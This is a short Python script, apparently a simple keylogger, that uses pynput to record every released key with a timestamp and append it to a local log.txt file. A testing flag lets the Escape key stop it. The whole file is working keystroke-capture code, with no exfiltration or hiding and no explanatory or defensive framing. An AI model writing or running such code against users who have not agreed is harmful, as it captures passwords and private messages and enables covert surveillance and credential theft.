import time
from pynput.keyboard import Key, Listener


TESTING = True


def on_release(key):

    if TESTING and key == Key.esc:
        return False

    logfile = open("log.txt", "a")
    logfile.write("{0}    {1}\n".format(time.strftime('%H:%M:%S'), str(key).strip("'")))


with Listener(on_release=on_release) as listener:
    listener.join()
